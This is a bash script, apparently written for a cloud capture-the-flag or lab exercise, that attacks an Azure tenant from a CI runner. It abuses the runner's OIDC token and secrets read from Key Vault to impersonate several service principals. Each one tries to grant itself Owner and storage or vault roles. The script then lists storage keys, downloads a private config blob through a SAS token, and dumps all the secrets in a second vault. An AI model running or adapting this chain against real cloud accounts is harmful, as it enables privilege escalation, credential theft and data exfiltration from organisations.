#!/usr/bin/env bash
# Decisive: can any principal self-grant a role (UAA/Owner)? Grant self Storage/KV role -> read flag.
set +e
SUB="$AZURE_SUBSCRIPTION_ID"; TEN="$AZURE_TENANT_ID"; RG="rg-tbl-platform-prod-sea"
APPCFG="sttblappcfgprodx3euoz"; AUD="api://AzureADTokenExchange"
mint(){ curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD" | jq -r .value; }
oidc(){ curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer -d "client_assertion=$(mint)" --data-urlencode "scope=$1" | jq -r .access_token; }
spk(){ curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$1" -d grant_type=client_credentials -d "client_secret=$2" --data-urlencode "scope=$3" | jq -r .access_token; }
la(){ curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=891fb158-e02c-4428-a885-53b811f369c0" -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer -d "client_assertion=$(mint)" --data-urlencode "scope=$1" | jq -r .access_token; }
guid(){ python3 -c "import uuid;print(uuid.uuid4())"; }
KVP=$(oidc "https://vault.azure.net/.default"); getsec(){ curl -s -H "Authorization: Bearer $KVP" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$1?api-version=7.4" | jq -r .value; }

SAC=17d1049b-9a84-46fb-8f53-869881c3d3ab   # Storage Account Contributor (listKeys)
SBDR=2a2b9908-6ea1-4ae2-8e65-a410df84e7d1  # Storage Blob Data Reader
KVSU=4633458b-17de-408a-b874-0445c86b69e6  # Key Vault Secrets User
OWNER=8e3af657-a8ff-443c-a75c-2fe8c4bcb635  # Owner
APPCFG_SCOPE="subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$APPCFG"
KVSEC_SCOPE="subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz"
RG_SCOPE="subscriptions/$SUB/resourceGroups/$RG"

# principals: name|oid|getter
declare -a P=("OIDC|63e87ab1-6bd2-4e80-92be-943450b20e4f|oidc" "legacy-admin|43834909-47cf-4a4a-8048-e323b4897ed3|la")
declare -A APPID=([sync-service-principal]=1 [secrets-sync-principal]=1 [cost-reader-principal]=1 [directory-audit-principal]=1 [reporting-service-principal]=1 [reporting-viewer-principal]=1)
declare -A OIDMAP=([sync-service-principal]=70a07660-06bb-4396-b754-59fbad0b143e [secrets-sync-principal]=c15570ad-5fd2-430c-97bb-a49e9a08d95c [cost-reader-principal]=1fe7a412-82e9-4135-ab4b-72a0be429adb [directory-audit-principal]=696cace1-fb1c-4ef3-a9b1-e9abe1681513 [reporting-service-principal]=732dfdbc-e325-4e9f-9ca9-359af1197807 [reporting-viewer-principal]=eca94ded-76e6-4bb7-b435-40543a8c6b5f)
for s in "${!OIDMAP[@]}"; do P+=("$s|${OIDMAP[$s]}|sp"); done

mgmt_for(){ case "$3" in oidc) oidc "https://management.azure.com/.default";; la) la "https://management.azure.com/.default";; sp) S=$(getsec "$1"); spk "$(echo "$S"|jq -r .appId)" "$(echo "$S"|jq -r .clientSecret)" "https://management.azure.com/.default";; esac; }

for e in "${P[@]}"; do IFS='|' read -r N OID G <<<"$e"
  T=$(mgmt_for "$N" "$OID" "$G"); [ ${#T} -lt 50 ] && { echo "[$N] no tok"; continue; }
  for rs in "$SAC@$APPCFG_SCOPE@storageacct-contrib-appcfg" "$SBDR@$APPCFG_SCOPE@blobreader-appcfg" "$KVSU@$KVSEC_SCOPE@kvsecrets-kvsec" "$OWNER@$RG_SCOPE@owner-rg"; do
    ROLE="${rs%%@*}"; rest="${rs#*@}"; SCOPE="${rest%@*}"; LBL="${rest##*@}"
    G1=$(guid)
    CODE=$(curl -s -o /tmp/ra -w '%{http_code}' -X PUT -H "Authorization: Bearer $T" -H "Content-Type: application/json" \
      "https://management.azure.com/$SCOPE/providers/Microsoft.Authorization/roleAssignments/$G1?api-version=2022-04-01" \
      -d "{\"properties\":{\"roleDefinitionId\":\"/subscriptions/$SUB/providers/Microsoft.Authorization/roleDefinitions/$ROLE\",\"principalId\":\"$OID\",\"principalType\":\"ServicePrincipal\"}}")
    echo "[$N] grant $LBL -> $CODE $( [ "$CODE" != 201 ] && [ "$CODE" != 200 ] && jq -r '.error.code//empty' /tmp/ra)"
  done
done

echo "### If any grant succeeded above, exercise now (OIDC/legacy/sync with appcfg key + kv-tbl-sec)"
sleep 20
for e in "${P[@]}"; do IFS='|' read -r N OID G <<<"$e"
  T=$(mgmt_for "$N" "$OID" "$G"); [ ${#T} -lt 50 ] && continue
  KR=$(curl -s -X POST -H "Authorization: Bearer $T" -H "Content-Length: 0" "https://management.azure.com/$APPCFG_SCOPE/listKeys?api-version=2023-05-01")
  KEY=$(echo "$KR"|jq -r '.keys[0].value // empty')
  if [ ${#KEY} -gt 20 ]; then
    echo "[$N] *** GOT APPCFG KEY"; SAS=$(curl -s -X POST -H "Authorization: Bearer $T" -H "Content-Type: application/json" "https://management.azure.com/$APPCFG_SCOPE/listAccountSas?api-version=2023-05-01" -d '{"signedServices":"b","signedResourceTypes":"sco","signedPermission":"rl","signedProtocol":"https","signedStart":"2026-10-22T00:00:00Z","signedExpiry":"2026-10-23T00:00:00Z"}' | jq -r .accountSasToken)
    echo "  config blobs: $(curl -s "https://$APPCFG.blob.core.windows.net/config?restype=container&comp=list&$SAS"|grep -o '<Name>[^<]*</Name>')"
    echo "  >>> internal-config.json:"; curl -s "https://$APPCFG.blob.core.windows.net/config/internal-config.json?$SAS"; echo
  fi
  TV=$(case "$G" in oidc) oidc "https://vault.azure.net/.default";; la) la "https://vault.azure.net/.default";; sp) S=$(getsec "$N"); spk "$(echo "$S"|jq -r .appId)" "$(echo "$S"|jq -r .clientSecret)" "https://vault.azure.net/.default";; esac)
  SE=$(curl -s -o /tmp/se -w '%{http_code}' -H "Authorization: Bearer $TV" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4")
  [ "$SE" = 200 ] && { echo "[$N] *** kv-tbl-sec READ:"; for ID in $(jq -r '.value[]?.id' /tmp/se); do echo "   $ID = $(curl -s -H "Authorization: Bearer $TV" "$ID?api-version=7.4"|jq -r .value)"; done; }
done
echo "=== DONE ==="
